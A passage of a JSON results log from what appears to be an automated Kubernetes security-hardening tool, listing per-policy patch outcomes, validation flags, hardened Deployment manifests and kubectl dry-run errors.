- --health-port=29602\n        - --v=2\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      - name: azuredisk\n        image: mcr.microsoft.com/k8s/csi/azuredisk-csi:v1.14.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29604\n        - --user-agent-suffix=OSS-kubectl\n        - --disable-avset-nodes=false\n        - --allow-empty-cloud-config=false\n        ports:\n        - containerPort: 29602\n          name: healthz\n          protocol: TCP\n        - containerPort: 29604\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "errors": []
  },
  {
    "id": "01155",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"tf-nightly-retinanet-func-v3-8\" namespace: \"automated\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01156",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"tf-nightly-retinanet-func-v3-8\" namespace: \"automated\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01157",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"tf-nightly-retinanet-func-v3-8\" namespace: \"automated\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01158",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"tf-nightly-retinanet-func-v3-8\" namespace: \"automated\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01159",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"tf-nightly-retinanet-func-v3-8\" namespace: \"automated\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01160",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"tf-nightly-retinanet-func-v3-8\" namespace: \"automated\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01161",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"tf-nightly-retinanet-func-v3-8\" namespace: \"automated\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01162",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"tf-nightly-retinanet-func-v3-8\" namespace: \"automated\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01163",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"tf-nightly-retinanet-func-v3-8\" namespace: \"automated\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01164",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"tf-nightly-retinanet-func-v3-8\" namespace: \"automated\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01165",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"tf-nightly-retinanet-func-v3-8\" namespace: \"automated\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01166",
    "policy_id": "env_var_secret",
    "accepted": false,
    "ok_schema": true,
    "ok_policy": false,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "environment variable PL_VIZIER_IMAGE_SECRET_FILE must use secretKeyRef"
    ]
  },
  {
    "id": "01167",
    "policy_id": "env_var_secret",
    "accepted": false,
    "ok_schema": true,
    "ok_policy": false,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "environment variable PL_VIZIER_IMAGE_SECRET_FILE must use secretKeyRef"
    ]
  },
  {
    "id": "01168",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: api-server\nspec:\n  selector:\n    matchLabels:\n      name: api-server\n  template:\n    metadata:\n      labels:\n        name: api-server\n    spec:\n      containers:\n      - name: api-server\n        image: gcr.io/pl-dev-infra/cloud/api_server_image:stable\n        ports:\n        - containerPort: 51200\n        readinessProbe:\n          httpGet:\n            scheme: HTTPS\n            path: /healthz\n            port: 51200\n        livenessProbe:\n          httpGet:\n            scheme: HTTPS\n            path: /healthz\n            port: 51200\n        envFrom:\n        - configMapRef:\n            name: pl-tls-config\n        - configMapRef:\n            name: pl-domain-config\n        env:\n        - name: PL_JWT_SIGNING_KEY\n          valueFrom:\n            secretKeyRef:\n              name: cloud-auth-secrets\n              key: jwt-signing-key\n        - name: PL_SESSION_KEY\n          valueFrom:\n            secretKeyRef:\n              name: cloud-session-secrets\n              key: session-key\n        - name: PL_VZMGR_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_VZMGR_SERVICE\n        - name: PL_AUTH_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_AUTH_SERVICE\n        - name: PL_PROJECT_MANAGER_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_PROJECT_MANAGER_SERVICE\n        - name: PL_PROFILE_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_PROFILE_SERVICE\n        - name: PL_ARTIFACT_TRACKER_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_ARTIFACT_TRACKER_SERVICE\n        - name: PL_ELASTIC_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_ELASTIC_SERVICE\n        - name: PL_SEGMENT_WRITE_KEY\n          valueFrom:\n            configMapKeyRef:\n              name: segment-config\n              key: write-key\n        - name: PL_VIZIER_IMAGE_SECRET_PATH\n          valueFrom:\n            secretKeyRef:\n              name: vizier-image-secret\n              key: pl_vizier_image_secret_path\n        - name: PL_VIZIER_IMAGE_SECRET_FILE\n          value: vizier_image_secret.json\n        - name: PL_ELASTIC_USERNAME\n          value: elastic\n        - name: PL_ELASTIC_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pl-elastic-es-elastic-user\n              key: elastic\n        - name: PL_ELASTIC_CA_CERT\n          value: /elastic-certs-pub/tls.crt\n        - name: PL_WORK_DOMAIN\n          value: work.$(PL_DOMAIN_NAME)\n        - name: PL_KRATOS_BROWSER_URL\n          value: https://$(PL_WORK_DOMAIN)/oauth/kratos\n        volumeMounts:\n        - name: certs\n          mountPath: /certs\n        - name: vizier-image-secret\n          mountPath: /vizier-image-secret\n        - name: elastic-certs-pub\n          mountPath: /elastic-certs-pub\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: certs\n        secret:\n          secretName: service-tls-certs\n      - name: vizier-image-secret\n        secret:\n          secretName: vizier-image-secret\n          optional: true\n      - name: envoy-yaml\n        configMap:\n          name: proxy-envoy-config\n      - name: elastic-certs-pub\n        secret:\n          secretName: pl-elastic-es-http-certs-public\n",
    "errors": []
  },
  {
    "id": "01169",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: api-server\nspec:\n  selector:\n    matchLabels:\n      name: api-server\n  template:\n    metadata:\n      labels:\n        name: api-server\n    spec:\n      containers:\n      - name: api-server\n        image: gcr.io/pl-dev-infra/cloud/api_server_image:stable\n        ports:\n        - containerPort: 51200\n        readinessProbe:\n          httpGet:\n            scheme: HTTPS\n            path: /healthz\n            port: 51200\n        livenessProbe:\n          httpGet:\n            scheme: HTTPS\n            path: /healthz\n            port: 51200\n        envFrom:\n        - configMapRef:\n            name: pl-tls-config\n        - configMapRef:\n            name: pl-domain-config\n        env:\n        - name: PL_JWT_SIGNING_KEY\n          valueFrom:\n            secretKeyRef:\n              name: cloud-auth-secrets\n              key: jwt-signing-key\n        - name: PL_SESSION_KEY\n          valueFrom:\n            secretKeyRef:\n              name: cloud-session-secrets\n              key: session-key\n        - name: PL_VZMGR_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_VZMGR_SERVICE\n        - name: PL_AUTH_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_AUTH_SERVICE\n        - name: PL_PROJECT_MANAGER_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_PROJECT_MANAGER_SERVICE\n        - name: PL_PROFILE_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_PROFILE_SERVICE\n        - name: PL_ARTIFACT_TRACKER_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_ARTIFACT_TRACKER_SERVICE\n        - name: PL_ELASTIC_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_ELASTIC_SERVICE\n        - name: PL_SEGMENT_WRITE_KEY\n          valueFrom:\n            configMapKeyRef:\n              name: segment-config\n              key: write-key\n        - name: PL_VIZIER_IMAGE_SECRET_PATH\n          valueFrom:\n            secretKeyRef:\n              name: vizier-image-secret\n              key: pl_vizier_image_secret_path\n        - name: PL_VIZIER_IMAGE_SECRET_FILE\n          value: vizier_image_secret.json\n        - name: PL_ELASTIC_USERNAME\n          value: elastic\n        - name: PL_ELASTIC_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pl-elastic-es-elastic-user\n              key: elastic\n        - name: PL_ELASTIC_CA_CERT\n          value: /elastic-certs-pub/tls.crt\n        - name: PL_WORK_DOMAIN\n          value: work.$(PL_DOMAIN_NAME)\n        - name: PL_KRATOS_BROWSER_URL\n          value: https://$(PL_WORK_DOMAIN)/oauth/kratos\n        volumeMounts:\n        - name: certs\n          mountPath: /certs\n        - name: vizier-image-secret\n          mountPath: /vizier-image-secret\n        - name: elastic-certs-pub\n          mountPath: /elastic-certs-pub\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: certs\n        secret:\n          secretName: service-tls-certs\n      - name: vizier-image-secret\n        secret:\n          secretName: vizier-image-secret\n          optional: true\n      - name: envoy-yaml\n        configMap:\n          name: proxy-envoy-config\n      - name: elastic-certs-pub\n        secret:\n          secretName: pl-elastic-es-http-certs-public\n",
    "errors": []
  },
  {
    "id": "01170",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: api-server\nspec:\n  selector:\n    matchLabels:\n      name: api-server\n  template:\n    metadata:\n      labels:\n        name: api-server\n    spec:\n      containers:\n      - name: api-server\n        image: gcr.io/pl-dev-infra/cloud/api_server_image:stable\n        ports:\n        - containerPort: 51200\n        readinessProbe:\n          httpGet:\n            scheme: HTTPS\n            path: /healthz\n            port: 51200\n        livenessProbe:\n          httpGet:\n            scheme: HTTPS\n            path: /healthz\n            port: 51200\n        envFrom:\n        - configMapRef:\n            name: pl-tls-config\n        - configMapRef:\n            name: pl-domain-config\n        env:\n        - name: PL_JWT_SIGNING_KEY\n          valueFrom:\n            secretKeyRef:\n              name: cloud-auth-secrets\n              key: jwt-signing-key\n        - name: PL_SESSION_KEY\n          valueFrom:\n            secretKeyRef:\n              name: cloud-session-secrets\n              key: session-key\n        - name: PL_VZMGR_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_VZMGR_SERVICE\n        - name: PL_AUTH_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_AUTH_SERVICE\n        - name: PL_PROJECT_MANAGER_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_PROJECT_MANAGER_SERVICE\n        - name: PL_PROFILE_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_PROFILE_SERVICE\n        - name: PL_ARTIFACT_TRACKER_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_ARTIFACT_TRACKER_SERVICE\n        - name: PL_ELASTIC_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_ELASTIC_SERVICE\n        - name: PL_SEGMENT_WRITE_KEY\n          valueFrom:\n            configMapKeyRef:\n              name: segment-config\n              key: write-key\n        - name: PL_VIZIER_IMAGE_SECRET_PATH\n          valueFrom:\n            secretKeyRef:\n              name: vizier-image-secret\n              key: pl_vizier_image_secret_path\n        - name: PL_VIZIER_IMAGE_SECRET_FILE\n          value: vizier_image_secret.json\n        - name: PL_ELASTIC_USERNAME\n          value: elastic\n        - name: PL_ELASTIC_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pl-elastic-es-elastic-user\n              key: elastic\n        - name: PL_ELASTIC_CA_CERT\n          value: /elastic-certs-pub/tls.crt\n        - name: PL_WORK_DOMAIN\n          value: work.$(PL_DOMAIN_NAME)\n        - name: PL_KRATOS_BROWSER_URL\n          value: https://$(PL_WORK_DOMAIN)/oauth/kratos\n        volumeMounts:\n        - name: certs\n          mountPath: /certs\n        - name: vizier-image-secret\n          mountPath: /vizier-image-secret\n        - name: elastic-certs-pub\n          mountPath: /elastic-certs-pub\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: certs\n        secret:\n          secretName: service-tls-certs\n      - name: vizier-image-secret\n        secret:\n          secretName: vizier-image-secret\n          optional: true\n      - name: envoy-yaml\n        configMap:\n          name: proxy-envoy-config\n      - name: elastic-certs-pub\n        secret:\n          secretName: pl-elastic-es-http-certs-public\n",
    "errors": []
  },
  {
    "id": "01171",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: api-server\nspec:\n  selector:\n    matchLabels:\n      name: api-server\n  template:\n    metadata:\n      labels:\n        name: api-server\n    spec:\n      containers:\n      - name: api-server\n        image: gcr.io/pl-dev-infra/cloud/api_server_image:stable\n        ports:\n        - containerPort: 51200\n        readinessProbe:\n          httpGet:\n            scheme: HTTPS\n            path: /healthz\n            port: 51200\n        livenessProbe:\n          httpGet:\n            scheme: HTTPS\n            path: /healthz\n            port: 51200\n        envFrom:\n        - configMapRef:\n            name: pl-tls-config\n        - configMapRef:\n            name: pl-domain-config\n        env:\n        - name: PL_JWT_SIGNING_KEY\n          valueFrom:\n            secretKeyRef:\n              name: cloud-auth-secrets\n              key: jwt-signing-key\n        - name: PL_SESSION_KEY\n          valueFrom:\n            secretKeyRef:\n              name: cloud-session-secrets\n              key: session-key\n        - name: PL_VZMGR_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_VZMGR_SERVICE\n        - name: PL_AUTH_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_AUTH_SERVICE\n        - name: PL_PROJECT_MANAGER_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_PROJECT_MANAGER_SERVICE\n        - name: PL_PROFILE_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_PROFILE_SERVICE\n        - name: PL_ARTIFACT_TRACKER_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_ARTIFACT_TRACKER_SERVICE\n        - name: PL_ELASTIC_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_ELASTIC_SERVICE\n        - name: PL_SEGMENT_WRITE_KEY\n          valueFrom:\n            configMapKeyRef:\n              name: segment-config\n              key: write-key\n        - name: PL_VIZIER_IMAGE_SECRET_PATH\n          valueFrom:\n            secretKeyRef:\n              name: vizier-image-secret\n              key: pl_vizier_image_secret_path\n        - name: PL_VIZIER_IMAGE_SECRET_FILE\n          value: vizier_image_secret.json\n        - name: PL_ELASTIC_USERNAME\n          value: elastic\n        - name: PL_ELASTIC_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pl-elastic-es-elastic-user\n              key: elastic\n        - name: PL_ELASTIC_CA_CERT\n          value: /elastic-certs-pub/tls.crt\n        - name: PL_WORK_DOMAIN\n          value: work.$(PL_DOMAIN_NAME)\n        - name: PL_KRATOS_BROWSER_URL\n          value: https://$(PL_WORK_DOMAIN)/oauth/kratos\n        volumeMounts:\n        - name: certs\n          mountPath: /certs\n        - name: vizier-image-secret\n          mountPath: /vizier-image-secret\n        - name: elastic-certs-pub\n          mountPath: /elastic-certs-pub\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: certs\n        secret:\n          secretName: service-tls-certs\n      - name: vizier-image-secret\n        secret:\n          secretName: vizier-image-secret\n          optional: true\n      - name: envoy-yaml\n        configMap:\n          name: proxy-envoy-config\n      - name: elastic-certs-pub\n        secret:\n          secretName: pl-elastic-es-http-certs-public\n",
    "errors": []
  },
  {
    "id": "01172",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: api-server\nspec:\n  selector:\n    matchLabels:\n      name: api-server\n  template:\n    metadata:\n      labels:\n        name: api-server\n    spec:\n      containers:\n      - name: api-server\n        image: gcr.io/pl-dev-infra/cloud/api_server_image:stable\n        ports:\n        - containerPort: 51200\n        readinessProbe:\n          httpGet:\n            scheme: HTTPS\n            path: /healthz\n            port: 51200\n        livenessProbe:\n          httpGet:\n            scheme: HTTPS\n            path: /healthz\n            port: 51200\n        envFrom:\n        - configMapRef:\n            name: pl-tls-config\n        - configMapRef:\n            name: pl-domain-config\n        env:\n        - name: PL_JWT_SIGNING_KEY\n          valueFrom:\n            secretKeyRef:\n              name: cloud-auth-secrets\n              key: jwt-signing-key\n        - name: PL_SESSION_KEY\n          valueFrom:\n            secretKeyRef:\n              name: cloud-session-secrets\n              key: session-key\n        - name: PL_VZMGR_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_VZMGR_SERVICE\n        - name: PL_AUTH_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_AUTH_SERVICE\n        - name: PL_PROJECT_MANAGER_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_PROJECT_MANAGER_SERVICE\n        - name: PL_PROFILE_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_PROFILE_SERVICE\n        - name: PL_ARTIFACT_TRACKER_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_ARTIFACT_TRACKER_SERVICE\n        - name: PL_ELASTIC_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_ELASTIC_SERVICE\n        - name: PL_SEGMENT_WRITE_KEY\n          valueFrom:\n            configMapKeyRef:\n              name: segment-config\n              key: write-key\n        - name: PL_VIZIER_IMAGE_SECRET_PATH\n          valueFrom:\n            secretKeyRef:\n              name: vizier-image-secret\n              key: pl_vizier_image_secret_path\n        - name: PL_VIZIER_IMAGE_SECRET_FILE\n          value: vizier_image_secret.json\n        - name: PL_ELASTIC_USERNAME\n          value: elastic\n        - name: PL_ELASTIC_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pl-elastic-es-elastic-user\n              key: elastic\n        - name: PL_ELASTIC_CA_CERT\n          value: /elastic-certs-pub/tls.crt\n        - name: PL_WORK_DOMAIN\n          value: work.$(PL_DOMAIN_NAME)\n        - name: PL_KRATOS_BROWSER_URL\n          value: https://$(PL_WORK_DOMAIN)/oauth/kratos\n        volumeMounts:\n        - name: certs\n          mountPath: /certs\n        - name: vizier-image-secret\n          mountPath: /vizier-image-secret\n        - name: elastic-certs-pub\n          mountPath: /elastic-certs-pub\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: certs\n        secret:\n          secretName: service-tls-certs\n      - name: vizier-image-secret\n        secret:\n          secretName: vizier-image-secret\n          optional: true\n      - name: envoy-yaml\n        configMap:\n          name: proxy-envoy-config\n      - name: elastic-certs-pub\n        secret:\n          secretName: pl-elastic-es-http-certs-public\n",
    "errors": []
  },
  {
    "id": "01173",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mull-frontend\n  namespace: mull\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: mull-frontend\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: mull-frontend\n    spec:\n      containers:\n      - name: mull-frontend\n        image: ritchellegmp/mull-frontend:stable\n        imagePullPolicy: Always\n        ports:\n        - name: frontend\n          containerPort: 4200\n          protocol: TCP\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01174",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mull-frontend\n  namespace: mull\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: mull-frontend\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: mull-frontend\n    spec:\n      containers:\n      - name: mull-frontend\n        image: ritchellegmp/mull-frontend:stable\n        imagePullPolicy: Always\n        ports:\n        - name: frontend\n          containerPort: 4200\n          protocol: TCP\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01175",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mull-frontend\n  namespace: mull\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: mull-frontend\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: mull-frontend\n    spec:\n      containers:\n      - name: mull-frontend\n        image: ritchellegmp/mull-frontend:stable\n        imagePullPolicy: Always\n        ports:\n        - name: frontend\n          containerPort: 4200\n          protocol: TCP\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01176",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
